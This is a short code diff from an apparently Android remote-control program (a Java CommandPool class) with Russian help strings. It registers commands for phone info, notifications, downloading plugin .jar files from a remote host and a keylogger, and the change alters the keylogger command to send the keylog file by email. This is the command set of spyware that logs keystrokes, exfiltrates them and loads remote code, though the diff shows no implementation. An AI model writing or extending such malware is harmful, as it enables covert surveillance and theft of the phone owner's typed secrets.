@@ -154,7 +154,7 @@ public class CommandPool {
 		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
 		Add(new CommandObjNotify(CommandObj.CMD_NOTIFY,"text:<message> - вывести сообщение в область уведомлений"));
 		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command or <plugin>.jar>][list]"));
-		Add(new CommandObjGetKeyLog(CommandObj.CMD_GET_KEYLOG,"[off|on] - запустить кейлоггер"));
+		Add(new CommandObjGetKeyLog(CommandObj.CMD_GET_KEYLOG,"получить файл кейлога на почту"));
 		
 		//Add(new CommandObjInvoke(CommandObj.CMD_INVOKE,"[command name] [params..]"));
 		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
